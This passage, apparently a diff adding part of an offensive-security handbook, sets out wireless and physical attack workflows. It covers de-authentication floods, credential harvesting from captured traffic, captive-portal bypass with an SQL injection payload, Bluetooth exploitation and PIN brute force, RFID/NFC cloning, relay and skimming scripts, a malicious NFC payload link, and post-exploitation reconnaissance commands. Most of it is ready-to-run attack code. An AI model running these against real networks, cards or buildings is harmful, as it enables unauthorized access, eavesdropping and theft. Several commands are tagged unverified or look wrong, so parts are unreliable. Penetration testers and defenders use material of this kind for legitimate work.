+# -0: de-authentication packets
+# 0: continuous flood
+# -a: target BSSID
+
+# Targeted de-auth (specific client)
+sudo aireplay-ng -0 10 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0
+```
+
+**Traffic Analysis and Credential Harvesting**
+
+Monitor and extract credentials from captured traffic:
+
+```bash
+# Analyze captured mitmproxy traffic
+mitmproxy -r captured_traffic.mitm
+
+# Extract credentials from PCAP
+sudo tcpdump -r traffic.pcap -i any | grep -E "password|login|user"
+
+# Parse HTTP POST data
+sudo tcpdump -r traffic.pcap -A -n | grep -E "POST|password|username"
+
+# Extract from mitmproxy flow
+mitmdump -r captured_traffic.mitm -q "~q & ~t image"
+```
+
+**Detection and Countermeasures**
+
+[Inference] Rogue AP detection relies on identifying suspicious network characteristics. Defenders can identify rogue APs through:
+
+- Signal strength analysis (unusually strong signal near entry points)
+- Certificate inspection (self-signed certificates)
+- MAC address comparison (known legitimate MAC prefixes)
+- BSSID stability monitoring (legitimate APs have consistent BSSIDs)
+
+## Captive Portal Bypass
+
+Captive portals present authentication pages to unauthenticated users before granting internet access. Bypass techniques vary depending on portal implementation and detection mechanisms.
+
+**Portal Detection and Analysis**
+
+Identify captive portal characteristics:
+
+```bash
+# Detect portal presence via HTTP request
+curl -v http://192.168.1.1:8080/
+
+# Check for HTTP redirect
+curl -L -v http://example.com | head -20
+
+# Analyze redirect target
+curl -i http://captive.apple.com/hotspot-detect.html
+
+# Check HTTP status codes
+curl -s -o /dev/null -w "%{http_code}" http://captive.apple.com/hotspot-detect.html
+# 200 = internet connectivity
+# 302 = captive portal redirect
+```
+
+**Portal Page Analysis**
+
+Extract portal page content for vulnerability assessment:
+
+```bash
+# Download portal page
+wget -O portal.html http://192.168.1.1:8080/
+
+# Analyze HTML for hidden fields
+grep -E "input type|hidden|name=" portal.html
+
+# Extract authentication parameters
+strings portal.html | grep -E "username|password|token|session"
+
+# Analyze JavaScript for client-side validation
+strings portal.html | grep -E "javascript|function|var " | head -20
+```
+
+**HTTP Header Manipulation**
+
+Bypass portal detection through modified headers:
+
+```bash
+# Mimic legitimate client detection
+curl -H "User-Agent: CaptiveNetworkSupport/1.0 CFNetwork/537.36" \
+     -H "X-Apple-WISPD-Version: 1.0" \
+     http://192.168.1.1/
+
+# Spoof device type
+curl -H "User-Agent: iPhone OS 15_0" \
+     -H "Accept: */*" \
+     http://192.168.1.1/
+
+# Inject bypass headers
+curl -H "X-Forwarded-For: 8.8.8.8" \
+     -H "X-Original-URL: http://example.com" \
+     http://192.168.1.1/
+```
+
+**Direct HTTP Request Bypass**
+
+Execute requests bypassing portal interception:
+
+```bash
+# Connect directly to external IP (if portal only filters DNS)
+curl -v http://8.8.8.8/
+
+# Use alternative protocols
+# HTTPS may bypass HTTP-only portals
+curl -k https://192.168.1.1/
+
+# HTTP/2 or HTTP/3 bypass (if portal only filters HTTP/1.1)
+curl -v --http2 http://192.168.1.1/
+```
+
+**DNS-Based Bypass**
+
+Circumvent portal through DNS resolution manipulation:
+
+```bash
+# Query external DNS directly
+nslookup example.com 8.8.8.8
+
+# Use DNS-over-HTTPS
+curl -H "accept: application/dns-json" \
+     "https://1.1.1.1/dns-query?name=example.com&type=A"
+
+# Configure system DNS to bypass portal
+echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
+echo "nameserver 1.1.1.1" | sudo tee -a /etc/resolv.conf
+```
+
+**MAC Address Spoofing**
+
+Register with portal using different MAC, then change to bypass:
+
+```bash
+# Identify current MAC
+ip link show wlan0
+
+# Spoof MAC address
+sudo ip link set wlan0 down
+sudo ip link set wlan0 address 00:11:22:33:44:55
+sudo ip link set wlan0 up
+
+# Disconnect from portal-protected AP
+sudo nmcli device disconnect wlan0
+
+# Connect with new MAC
+sudo nmcli device connect wlan0
+
+# Request new DHCP lease
+sudo dhclient -r wlan0
+sudo dhclient wlan0
+```
+
+**Portal Authentication Bypass via Direct Access**
+
+Directly access portal backend or authentication endpoints:
+
+```bash
+# Common portal paths
+curl http://192.168.1.1/login.php
+curl http://192.168.1.1/auth.php
+curl http://192.168.1.1/portal/login
+
+# Attempt SQL injection in login
+curl -d "username=admin' OR '1'='1&password=admin" \
+     http://192.168.1.1/login.php
+
+# Check for unauthenticated access to admin panel
+curl http://192.168.1.1/admin/
+curl http://192.168.1.1/admin/users
+```
+
+**Session Token Extraction and Reuse**
+
+Capture and reuse valid session tokens:
+
+```bash
+# Capture authentication request
+sudo tcpdump -i wlan0 -A -s 0 'tcp port 80' | grep -E "GET|POST|Cookie"
+
+# Extract session cookie from authenticated user
+grep -i "set-cookie" captured_response.txt
+
+# Reuse session token
+curl -H "Cookie: SESSIONID=extracted_token_value" \
+     http://192.168.1.1/
+```
+
+**Browser Automation for Portal Bypass**
+
+Use browser automation to complete portal authentication:
+
+```python
+#!/usr/bin/env python3
+# portal_bypass.py
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+import time
+
+# Create headless browser instance
+options = webdriver.ChromeOptions()
+options.add_argument("--headless")
+driver = webdriver.Chrome(options=options)
+
+try:
+    # Navigate to portal
+    driver.get("http://192.168.1.1:8080/")
+    
+    # Fill login form
+    username_field = driver.find_element(By.NAME, "username")
+    password_field = driver.find_element(By.NAME, "password")
+    
+    username_field.send_keys("admin")
+    password_field.send_keys("password")
+    
+    # Submit form
+    submit_button = driver.find_element(By.CSS_SELECTOR, "input[type='submit']")
+    submit_button.click()
+    
+    time.sleep(3)
+    
+    # Verify authentication
+    if "Welcome" in driver.page_source or "logout" in driver.page_source.lower():
+        print("[+] Authentication successful")
+        
+        # Extract cookies
+        cookies = driver.get_cookies()
+        for cookie in cookies:
+            print(f"[+] Cookie: {cookie['name']}={cookie['value']}")
+    
+finally:
+    driver.quit()
+```
+
+**IPv6 Bypass**
+
+Exploit IPv6 connectivity when portal only filters IPv4:
+
+```bash
+# Check IPv6 connectivity
+ping6 2001:4860:4860::8888
+
+# Connect via IPv6
+curl -6 http://[2001:4860:4860::8888]/
+
+# If local IPv6 available
+ip -6 route add default via fe80::1 dev wlan0
+curl -6 http://example.com/
+```
+
+**Proxy and VPN Bypass Chains**
+
+Chain multiple bypass techniques:
+
+```bash
+# Through captured portal gateway, establish SSH tunnel
+ssh -D 1080 user@external_server
+
+# Route traffic through tunnel
+curl -x socks5://127.0.0.1:1080 http://example.com/
+
+# Or establish VPN through captured portal
+openvpn --config openvpn.conf
+```
+
+## Bluetooth Enumeration
+
+Bluetooth wireless technology presents a separate attack surface. Enumeration identifies discoverable devices, services, and vulnerabilities.
+
+**Bluetooth Device Discovery**
+
+Scan for Bluetooth devices in range:
+
+```bash
+# Verify Bluetooth adapter
+hciconfig
+hcitool dev
+
+# Reset Bluetooth adapter
+sudo hciconfig hci0 reset
+
+# Passive scan (doesn't alert devices)
+sudo hcitool scan
+
+# Active scan with timing
+sudo timeout 60 hcitool scan --flush
+
+# Continuous scanning
+while true; do
+    sudo hcitool scan
+    sleep 5
+done
+```
+
+**Device Information Extraction**
+
+Query detailed Bluetooth device information:
+
+```bash
+# Get device name
+hcitool name [DEVICE_MAC]
+
+# Get device info
+hcitool info [DEVICE_MAC]
+
+# Check device class/type
+hcitool class [DEVICE_MAC]
+
+# Get RSSI (signal strength)
+hcitool rssi [DEVICE_MAC]
+
+# Get link quality
+hcitool lq [DEVICE_MAC]
+```
+
+**Service Discovery Protocol (SDP) Enumeration**
+
+Identify services offered by Bluetooth devices:
+
+```bash
+# Query SDP database
+sudo sdptool browse [DEVICE_MAC]
+
+# Search for specific service type
+sudo sdptool search --uuid [UUID] [DEVICE_MAC]
+
+# Common UUIDs:
+# 0000110e-0000-1000-8000-00805f9b34fb (Audio Sink)
+# 0000111f-0000-1000-8000-00805f9b34fb (Headset Audio Gateway)
+# 00001105-0000-1000-8000-00805f9b34fb (OBEXObjectPush)
+```
+
+**BlueZ Tool Suite Enumeration**
+
+Use BlueZ utilities for comprehensive Bluetooth discovery:
+
+```bash
+# Interactive Bluetooth controller
+bluetoothctl
+
+# From bluetoothctl:
+# scan on
+# devices
+# info [MAC]
+# show
+
+# Command-line equivalents
+sudo bluetoothctl power on
+sudo bluetoothctl scan on &
+sleep 30
+sudo bluetoothctl devices
+sudo bluetoothctl info [MAC]
+```
+
+**Bluetooth Adapter Capabilities**
+
+Identify supported Bluetooth versions and features:
+
+```bash
+# Get adapter capabilities
+hcitool cmd 0x04 0x03
+# Returns supported commands
+
+# Get local version
+hcitool cmd 0x04 0x01
+
+# Get device features
+hcitool cmd 0x04 0x04
+
+# Parse Bluetooth version
+hciconfig hci0 | grep -i "version"
+```
+
+**MAC Address Analysis**
+
+Determine device types from MAC addresses:
+
+```bash
+# Extract manufacturer from MAC
+sudo hcitool cmd 0x04 0x09 | xxd
+
+# Cross-reference manufacturer code
+# First 3 octets (OUI) identify manufacturer
+# Example: Apple = 4C:xx:xx
+
+# Query manufacturer database
+echo "4C" | awk '{print "Apple"}' # Known mappings
+```
+
+**Bluetooth Link Key Extraction** [Unverified]
+
+Attempt to extract previously paired device link keys:
+
+```bash
+# Check stored link keys
+sudo cat /var/lib/bluetooth/[ADAPTER_MAC]/linkkeys
+
+# BlueZ configuration
+sudo cat /etc/bluetooth/main.conf
+
+# Query HCI for stored keys
+hcitool cmd 0x01 0x13
+# Return list of link keys
+```
+
+[Inference] Link key extraction requires filesystem access or HCI command support; availability depends on Bluetooth implementation.
+
+**Extended Inquiry Response (EIR) Analysis**
+
+Parse EIR data from scan results:
+
+```bash
+# Capture EIR data
+sudo hcitool -i hci0 scan
+
+# Parse extended information
+# Contains device name, TX power, manufacturer data
+
+#!/bin/bash
+# Extract EIR data from device
+DEVICE_MAC=$1
+hcitool info $DEVICE_MAC | grep -i "EIR"
+```
+
+**Bluetooth Low Energy (BLE) Enumeration**
+
+Discover BLE devices and characteristics:
+
+```bash
+# Scan for BLE devices
+sudo hcitool -i hci0 lescan
+
+# Get BLE device information
+sudo bluetoothctl scan on
+
+# Connect to BLE device
+sudo bluetoothctl connect [MAC]
+
+# List GATT characteristics
+sudo bluetoothctl gatt.list-attributes [DEVICE_PATH]
+
+# Read characteristic
+sudo bluetoothctl gatt.read [CHARACTERISTIC_PATH]
+```
+
+**Bluetooth Packet Capture**
+
+Capture Bluetooth traffic for analysis:
+
+```bash
+# Create virtual Bluetooth monitor
+sudo btmon
+
+# Capture to file
+sudo btmon --write=bluetooth_capture.btsnoop
+
+# Analyze with Wireshark
+wireshark bluetooth_capture.btsnoop
+
+# Monitor specific device
+sudo hcidump -i hci0 -X
+```
+
+## Bluetooth Exploitation
+
+Bluetooth vulnerabilities enable unauthorized pairing, service access, and data interception.
+
+**Bluetooth Pairing Attacks**
+
+Exploit weak pairing mechanisms:
+
+```bash
+# Just Works pairing (no authentication)
+# Device automatically accepts pairing
+
+# Pin Entry pairing (weak PINs)
+# Common defaults: 0000, 1111, 1234, 9999
+
+# Out-of-Band (OOB) pairing
+# Requires prior key exchange outside Bluetooth
+```
+
+**Unbonded Service Access**
+
+Access services without device pairing:
+
+```bash
+# Connect to unsecured service
+sudo rfcomm connect /dev/rfcomm0 [DEVICE_MAC] [CHANNEL]
+
+# Attempt to communicate
+echo "command" > /dev/rfcomm0
+cat /dev/rfcomm0
+```
+
+**GATT Characteristic Exploitation**
+
+Write malicious data to Bluetooth characteristics:
+
+```bash
+# Connect to BLE device
+sudo bluetoothctl connect [MAC]
+
+# List characteristics
+sudo bluetoothctl gatt.list-attributes
+
+# Write to characteristic
+sudo bluetoothctl gatt.write [PATH] [VALUE]
+
+# Example: Set device name
+sudo bluetoothctl gatt.write /org/bluez/hci0/dev_[MAC]/service0000/char0001 "Hacked"
+```
+
+**Bluetooth Man-in-the-Middle (MITM)**
+
+Intercept and modify Bluetooth communications:
+
+```bash
+# Using bettercap for Bluetooth MITM
+sudo bettercap -iface wlan0 -caplet http-ui -eval "
+set ble.recon on
+ble.recon on
+ble.show
+"
+
+# Create rogue Bluetooth device
+# (Technical setup varies by implementation)
+```
+
+**Bluetooth Device Impersonation**
+
+Spoof legitimate Bluetooth device:
+
+```bash
+# Identify target device MAC
+TARGET_MAC="[LEGITIMATE_DEVICE_MAC]"
+
+# Change local device MAC to match
+sudo hciconfig hci0 down
+sudo hciconfig hci0 reset
+# Note: MAC spoofing via HCI is device-dependent
+
+# Advertise same GATT services
+sudo bluetoothctl advertise on
+```
+
+**BLE Advertising Injection**
+
+Inject malicious BLE advertisements:
+
+```bash
+# Using hcitool to set advertising data
+sudo hcitool -i hci0 cmd 0x08 0x0008 \
+    1e \
+    02 01 06 \
+    1b ff 4c 00 02 15 \
+    [UUID] \
+    [MAJOR:2 bytes] \
+    [MINOR:2 bytes] \
+    [TX_POWER] \
+
+# This injects iBeacon-format advertisement
+```
+
+**Service Credential Extraction**
+
+Extract credentials from Bluetooth services:
+
+```bash
+# Connect to device
+sudo rfcomm connect /dev/rfcomm0 [MAC] [CHANNEL]
+
+# Interact with service
+cat /dev/rfcomm0
+
+# Send known commands
+echo "AT+COPS?" > /dev/rfcomm0
+
+# Capture responses containing credentials
+nc [DEVICE_IP] [PORT] | tee -a captured_data.txt
+```
+
+**Bluetooth Protocol Reverse Engineering**
+
+Analyze unknown Bluetooth protocols:
+
+```bash
+# Capture and analyze traffic
+sudo btmon --write=protocol.btsnoop
+
+# Analyze in Wireshark
+# Look for patterns:
+# - Initialization sequences
+# - Command format
+# - Response structures
+
+# Common Bluetooth profiles:
+# AT commands (hands-free)
+# OBEX (object exchange)
+# RFCOMM (serial emulation)
+```
+
+**BLE Peripheral Mode Exploitation**
+
+Create malicious BLE peripheral:
+
+```bash
+# Using BlueZ GATT Server
+cat > gatt_service.py << 'EOF'
+import dbus
+import dbus.service
+import dbus.mainloop.glib
+from gi.repository import GLib
+
+class GATTService(dbus.service.Object):
+    PATH_BASE = '/org/bluez/hci0/app'
+    
+    def __init__(self, bus, index):
+        self.path = self.PATH_BASE + '/service' + str(index)
+        dbus.service.Object.__init__(self, bus, self.path)
+        self.props = {
+            'UUID': '12345678-1234-5678-1234-56789abcdef0',
+            'Primary': True,
+            'Characteristics': []
+        }
+
+# Initialize and start service
+EOF
+
+python3 gatt_service.py
+```
+
+**Bluetooth Classic Audio Interception**
+
+Capture Bluetooth audio streams:
+
+```bash
+# Enable audio snooping
+sudo hcitool -i hci0 cmd 0x3f 0x0ca
+# Enable enhanced snooping
+
+# Capture with btmon
+sudo btmon --write=audio.btsnoop
+
+# Decode audio from captured packets
+# Tools: SBC (Subband Codec) decoder for A2DP profile
+```
+
+**Bluetooth Classic PIN/Passkey Attacks**
+
+Exploit weak PIN/passkey authentication:
+
+```bash
+# Common PINs to attempt
+PINS=("0000" "1111" "1234" "4321" "9999" "0001")
+
+# Automated PIN brute force (device-specific)
+for pin in "${PINS[@]}"; do
+    sudo hcitool cc [DEVICE_MAC]
+    # Simulate PIN entry
+    sudo hcitool pin [DEVICE_MAC] "$pin"
+done
+```
+
+## RFID/NFC Analysis
+
+Radio Frequency Identification (RFID) and Near-Field Communication (NFC) technologies enable contactless data exchange over short distances.
+
+**RFID Frequency Identification**
+
+Determine RFID frequency bands in use:
+
+```bash
+# Common RFID frequencies:
+# 125 kHz (Low Frequency, LF): Access control, animal tracking
+# 13.56 MHz (High Frequency, HF): Smartcards, NFC
+# 860-960 MHz (Ultra High Frequency, UHF): Inventory, supply chain
+
+# Identify frequency with signal analysis
+# Using Software Defined Radio (SDR) or spectrum analyzer
+```
+
+**NFC Device Detection**
+
+Identify NFC-capable devices and nearby targets:
+
+```bash
+# Check if system supports NFC
+ls /dev/nfc*
+
+# List NFC devices
+sudo nfc-list
+
+# Scan for NFC targets
+sudo nfc-poll
+
+# Continuous scanning
+while true; do
+    sudo nfc-poll
+    sleep 2
+done
+```
+
+**NFC Tag Reading**
+
+Extract data from NFC tags:
+
+```bash
+# Read NFC tag data
+sudo nfc-read
+
+# Get detailed tag information
+sudo nfc-list -v
+
+# Dump tag contents
+sudo nfcpy
+# Then: clf = ContactlessFrontend('usb')
+#       target = clf.poll()
+#       print(target.dump())
+
+# Using libnfc command-line tools
+nfc-mfclassic r a dump.mfd
+# Read Mifare Classic tag to file
+
+nfc-mfclassic w a dump.mfd data.mfd
+# Write to Mifare Classic tag
+```
+
+**NFC Type Detection**
+
+Classify NFC tag types:
+
+```bash
+# Type 1 (Topaz): 96 bytes, no authentication
+# Type 2 (Mifare Ultralight): 64 bytes, limited security
+# Type 3 (FeliCa): 2KB, cryptographic authentication
+# Type 4 (Mifare Desfire): ISO 14443A, AES encryption
+# Type 5 (ISO 15693): Larger memory, longer range
+
+# Detect tag type during scan
+sudo nfc-poll
+# Output includes: SENS_RES, SEL_RES, NFCID values
+```
+
+**RFID Passive Tag Enumeration**
+
+Discover passive RFID tags without power:
+
+```bash
+# RFID reader setup
+# Proxmark3 device commonly used for RFID enumeration
+
+# Using Proxmark3:
+proxmark3
+
+# Commands:
+# hw status
+# lf search  (Low Frequency search)
+# hf search  (High Frequency search)
+# lf t55xx detect  (T5577 tag detection)
+# hf mfu info  (Mifare Ultralight info)
+```
+
+**EM4100 RFID Cloning**
+
+Clone 125kHz EM4100 format RFID tags:
+
+```bash
+# Read EM4100 tag
+sudo proxmark3
+# hw status
+# lf em4x05 info
+
+# Capture EM4100 ID
+lf em 410x read
+# Outputs format like: EM410x Prox ID: [ID_DATA]
+
+# Clone to writable tag (T55xx)
+lf em 410x clone --id [EM_ID]
+```
+
+**Mifare Classic Tag Analysis**
+
+Enumerate and exploit Mifare Classic cards:
+
+```bash
+# List Mifare information
+sudo nfc-list -v
+
+# Using mfcuk to find default keys
+mfcuk -C -R 0:A -v 3
+
+# Read Mifare sectors
+sudo nfcpy
+# clf = ContactlessFrontend('usb')
+# target = clf.poll()
+# target.read_ndef()
+
+# Write to Mifare using libnfc
+nfc-mfclassic w a dump.mfd backup.mfd
+```
+
+**NFC Forum Record Parsing**
+
+Extract and analyze NDEF (NFC Data Exchange Format) records:
+
+```bash
+# NDEF record types:
+# TNF (Type Name Format)
+# Type: URI, Text, Media, Absolute URI, External, etc.
+
+# Read NDEF records
+sudo nfcpy
+# target.read_ndef()
+
+# Parse URI records
+# Common: http://, https://, mailto:, etc.
+
+# Automated NDEF extraction
+#!/bin/bash
+sudo nfc-poll | grep -E "Ndef|Text|URI"
+```
+
+**NFC Man-in-the-Middle (MITM)**
+
+Intercept NFC communication between reader and tag:
+
+```bash
+# Using two NFC devices
+# Device 1: Emulates target tag
+# Device 2: Emulates reader
+
+# Setup relay attack (long-range MITM)
+# Device A: Reader at location 1
+# Device B: Relay at location 1 (receives from A)
+# Device C: Relay at location 2 (transmits to D)
+# Device D: Tag at location 2
+
+# Proxmark3 relay setup
+proxmark3 -p [PORT1]
+# hw status
+# hf 14a sim 2  (Emulate Mifare)
+
+# Second Proxmark3 instance
+proxmark3 -p [PORT2]
+# hf mf sim --uid [UID]  (Emulate tag with specific UID)
+```
+
+**HID Prox Card Cloning**
+
+Clone HID proximity cards (125kHz):
+
+```bash
+# Read HID Prox card
+sudo proxmark3
+# lf search
+
+# Capture facility code and card number
+
+# HID Prox card cloning (continued)
+
+# Write to T55xx tag
+
+lf hid clone --id [FACILITY_CODE:CARD_NUMBER]
+
+# Verify clone
+
+lf search
+
+````
+
+**NFC Sticker/Label Encoding**
+
+Write data to NFC stickers for social engineering:
+
+```bash
+# Create malicious NDEF record
+#!/bin/bash
+# Using nfcpy to write records
+
+cat > nfc_write.py << 'EOF'
+import nfc.ndef
+import nfc.clf
+
+# Create URI record pointing to malicious site
+uri_record = nfc.ndef.UriRecord("https://malicious-site.com/payload")
+
+# Create text record
+text_record = nfc.ndef.TextRecord("Click here")
+
+# Write to NFC tag
+clf = nfc.clf.ContactlessFrontend('usb')
+target = clf.poll(nfc.clf.RemoteTarget)
+target.write_ndef(nfc.ndef.Message(uri_record))
+EOF
+
+python3 nfc_write.py
+````
+
+**RFID Cloning Attack Chain**
+
+Complete workflow for RFID tag cloning and deployment:
+
+```bash
+# 1. Identify target tag frequency and type
+proxmark3
+lf search  # Low frequency
+hf search  # High frequency
+
+# 2. Read target tag
+lf t55xx detect
+# or
+hf mfu info
+
+# 3. Extract unique identifiers (UID, facility code, etc.)
+lf em 410x read  # EM4100 format
+hf mf chk -k ffffffffffff  # Mifare default key
+
+# 4. Clone to blank tag
+lf em 410x clone --id [CAPTURED_ID]
+# or
+hf mf cload -f dump.mfd
+
+# 5. Test cloned tag
+lf search
+# Verify output matches original tag
+
+# 6. Deploy cloned tag in physical security bypass
+# (Use in access control reader, payment system, etc.)
+```
+
+**NFC Relay Attack Setup**
+
+Long-range MITM attack using two NFC readers:
+
+```bash
+# Location 1: Near legitimate card
+# Device 1: Read card and relay data
+cat > relay_1.py << 'EOF'
+import nfc.clf
+import socket
+
+clf = nfc.clf.ContactlessFrontend('usb:001,001')
+target = clf.poll(nfc.clf.RemoteTarget)
+
+# Get tag data
+tag_data = target.read_ndef()
+
+# Send to location 2 via network
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(('relay_2_server', 9999))
+sock.send(tag_data)
+sock.close()
+EOF
+
+# Location 2: Near access control reader
+# Device 2: Receive relayed data and emulate to reader
+cat > relay_2.py << 'EOF'
+import nfc.clf
+import socket
+
+# Receive relayed data
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('0.0.0.0', 9999))
+sock.listen(1)
+conn, addr = sock.accept()
+tag_data = conn.recv(1024)
+
+# Emulate tag to reader
+clf = nfc.clf.ContactlessFrontend('usb:001,002')
+target = clf.sense(nfc.clf.RemoteInitiator, timeout=1)
+target.write_ndef(tag_data)
+EOF
+
+# Run relay 1
+python3 relay_1.py &
+
+# Run relay 2
+python3 relay_2.py &
+```
+
+**ISO 15693 Tag Enumeration**
+
+Extended-range RFID tag analysis (13.56MHz):
+
+```bash
+# Using Proxmark3 for ISO15693
+proxmark3
+hf 15 info
+
+# Read ISO15693 tag
+hf 15 rdmem
+
+# Get NUID (Unique ID)
+hf 15 scan
+
+# ISO15693 tags often unencrypted
+# Data directly readable from memory blocks
+```
+
+**RFID Skimming and Data Harvesting**
+
+Unauthorized reading of RFID cards at distance:
+
+```bash
+# Long-range RFID reader setup
+# Amplified antenna (3-5 feet range for 125kHz)
+
+# Scan for nearby RFID tags continuously
+#!/bin/bash
+while true; do
+    proxmark3 -c "lf search"
+    sleep 2
+done > skimmed_tags.log
+
+# Parse and analyze captured data
+grep -oE "[0-9A-Fa-f]{10}" skimmed_tags.log | sort -u > unique_tags.txt
+
+# Export for further analysis or cloning
+cat unique_tags.txt
+```
+
+**Bluetooth + NFC Combination Attacks**
+
+Exploit multi-wireless systems:
+
+```bash
+# Scenario: Device supports both BLE and NFC
+
+# Step 1: Read NFC capability information
+sudo nfc-poll
+
+# Step 2: Establish BLE pairing
+sudo bluetoothctl connect [MAC]
+
+# Step 3: Use NFC to authenticate subsequent BLE operations
+# Some devices validate identity via both protocols
+
+# Attack: Spoof both protocols simultaneously
+# Read NFC tag identity
+# Forge BLE advertisement with matching identity
+```
+
+**RFID Signal Blocking and Replay**
+
+Capture and replay RFID signals:
+
+```bash
+# Using Software Defined Radio (Hack RF, USRP)
+# GNU Radio configuration for RFID replay
+
+# Capture RFID signal
+gnuradio-companion &
+# Create flowgraph:
+# File source -> Complex to Real -> File sink
+
+# Transmit captured signal
+gnuradio-companion &
+# Create flowgraph:
+# File source -> Real to Complex -> USRP Sink
+
+# Example with HackRF
+hackrf_transfer -r captured_signal.bin -f 125000000 -s 2000000
+
+# Replay to access control reader
+hackrf_transfer -t captured_signal.bin -f 125000000 -s 2000000
+```
+
+**EMV Contactless Payment Card Analysis**
+
+Examine contactless payment (NFC/RFID) cards:
+
+```bash
+# Detect contactless payment card
+sudo nfc-poll
+
+# Read public payment data (unencrypted)
+sudo nfcpy
+# target = clf.poll()
+# ndef = target.read_ndef()
+
+# Extract:
+# Application ID (AID)
+# Card number (first 6 digits PAN, last 4 digits)
+# Expiration date (if present)
+# Transaction counter
+
+# [Unverified] Full card data typically encrypted
+# Public data sufficient for fraud detection research
+
+# Analyze with EMV inspection tools
+# Note: Cloning modern EMV cards requires cryptographic keys
+# not easily extractable from RF signals
+```
+
+**NFC-Protected Area Bypass**
+
+Circumvent NFC-based security mechanisms:
+
+```bash
+# Scenario: NFC tag required to unlock door/device
+
+# Attack 1: Relay attack (covered above)
+
+# Attack 2: Signal jamming
+# Jam legitimate NFC signal, substitute relay signal
+# Using Software Defined Radio
+
+# Attack 3: Tag emulation
+# Extract tag UID/data
+# Program blank tag with extracted data
+proxmark3
+hf mf cload -f dump.mfd
+
+# Attack 4: Cryptographic bypass (if key extraction possible)
+# Some RFID implementations use weak encryption
+# Example: Mifare Classic uses 48-bit keys (cryptographically weak)
+mfcuk -C -R 0:A -v 3  # Find default/weak keys
+```
+
+**RFID Physical Reconnaissance**
+
+Perform site survey before RFID attacks:
+
+```bash
+# Identify RFID reader locations
+# Catalog frequency bands in use (125kHz, 13.56MHz)
+# Document antenna types and orientations
+# Note environmental factors (metal, water affecting signal)
+
+# Log signal strength at various distances
+#!/bin/bash
+for distance in 1 2 3 5 10 15 20; do
+    echo "Distance: ${distance} feet"
+    proxmark3 -c "lf search" 2>&1 | grep "Hit"
+    sleep 1
+done
+```
+
+**Documentation of Enumeration Results**
+
+Capture comprehensive RFID/NFC data for reporting:
+
+```bash
+#!/bin/bash
+# rfid_enum_report.sh
+
+OUTPUT_DIR="rfid_assessment_$(date +%Y%m%d)"
+mkdir -p "$OUTPUT_DIR"
+
+echo "[*] NFC Device Detection"
+sudo nfc-list > "$OUTPUT_DIR/nfc_devices.txt"
+
+echo "[*] NFC Tag Scanning"
+timeout 30 sudo nfc-poll > "$OUTPUT_DIR/nfc_scan_30s.txt"
+
+echo "[*] RFID Low Frequency Scan"
+proxmark3 -c "lf search" > "$OUTPUT_DIR/rfid_lf_scan.txt"
+
+echo "[*] RFID High Frequency Scan"
+proxmark3 -c "hf search" > "$OUTPUT_DIR/rfid_hf_scan.txt"
+
+echo "[*] Detailed analysis"
+cat "$OUTPUT_DIR"/*.txt > "$OUTPUT_DIR/combined_report.txt"
+
+echo "[+] Assessment complete: $OUTPUT_DIR"
+```
+
+---
+
+**Related Topics for Advanced Wireless Attack Scenarios**
+
+- **802.11 WPA3 Exploitation**: Advanced Wi-Fi security protocol attacks
+- **Bluetooth Mesh Network Attacks**: IoT mesh network exploitation
+- **5G Security Testing**: Next-generation cellular protocol weaknesses
+- **Software Defined Radio (SDR) for Wireless**: Frequency analysis and signal injection techniques
+- **Physical Layer Attacks**: Signal jamming, replay, and RF spoofing
+
+---
+
+# Post-Exploitation Enumeration
+
+## System Information Gathering
+
+Comprehensive system reconnaissance establishes the operational environment, identifies potential privilege escalation vectors, and informs persistence mechanism selection.
+
+**Operating System Identification**
+
+Determine OS type, version, and patch level:
+
+```bash
+# Linux/Unix OS information
+uname -a
+cat /etc/os-release
+cat /etc/issue
+lsb_release -a
+hostnamectl
+cat /proc/version
+
+# Distro-specific version files
+cat /etc/*-release
+cat /etc/redhat-release  # RHEL/CentOS
+cat /etc/debian_version  # Debian/Ubuntu
+cat /etc/slackware-version  # Slackware
+cat /etc/arch-release  # Arch Linux
+```
+
+Windows OS enumeration:
+
+```powershell
+# System information
+systeminfo
+Get-ComputerInfo
+Get-WmiObject -Class Win32_OperatingSystem | Select-Object *
+$PSVersionTable
+Get-Host
+
+# Edition and build
+(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName).ProductName
+(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name CurrentBuild).CurrentBuild
+
+# Patch level
+Get-HotFix
+Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object HotFixID, Description, InstalledOn
+```
+
+**Kernel Version and Patches**
+
+Extract kernel-specific information for exploit targeting:
+
+```bash
+# Kernel version
+uname -r
+cat /proc/version
+cat /proc/cmdline
+
+# Kernel parameters
+sysctl -a
+cat /proc/sys/kernel/*
+
+# Kernel modules (potential privilege escalation vectors)
+lsmod
+cat /proc/modules
+modinfo [module_name]
+
+# Kernel compile options
+cat /boot/config-$(uname -r) 2>/dev/null
+
+# ASLR status
+cat /proc/sys/kernel/randomize_va_space
+# 0 = disabled, 1 = partial, 2 = full
+
+# DEP/NX status
+dmesg | grep -i "NX\|DEP"
+```
+
+**System Architecture and Capabilities**
+
+Identify hardware limitations and features:
+
+```bash
+# CPU information
+uname -m
+getconf LONG_BIT
+lscpu
+cat /proc/cpuinfo
+
+# Memory information
+free -h
+cat /proc/meminfo
+vmstat
+
+# Disk information
+df -h
+lsblk
+fdisk -l
+mount
+
+# Device information
+lspci
+lsusb
+hwinfo --short
+
+# SELinux/AppArmor status
+getenforce  # SELinux
+aa-status   # AppArmor
+```
+
+**Hostname and Network Configuration**
+
+Extract network identity information:
+
+```bash
+# Hostname
+hostname
+hostname -f
+hostname -d
+cat /etc/hostname
+
+# Network interfaces
+ip addr
+ifconfig
+ip link show
+
+# Network configuration files
+cat /etc/network/interfaces
+cat /etc/sysconfig/network-scripts/ifcfg-*
+cat /etc/hosts
+cat /etc/resolv.conf
+
+# DNS configuration
+systemctl status systemd-resolved
+resolvectl status
+cat /etc/resolv.conf
+```
+
+**Timezone and Locale Configuration**
+
+Determine system locale settings (useful for targeted exploitation):
+
+```bash
+# Timezone
+date
+timedatectl
+cat /etc/timezone
+ls -la /etc/localtime
+
+# Locale settings
+locale
+localectl
+cat /etc/locale.conf
+echo $LANG
+
+# System time synchronization
+timedatectl
+systemctl status systemd-timesyncd
+ntpq -p
+```
+
+**Container and Virtualization Detection**
+
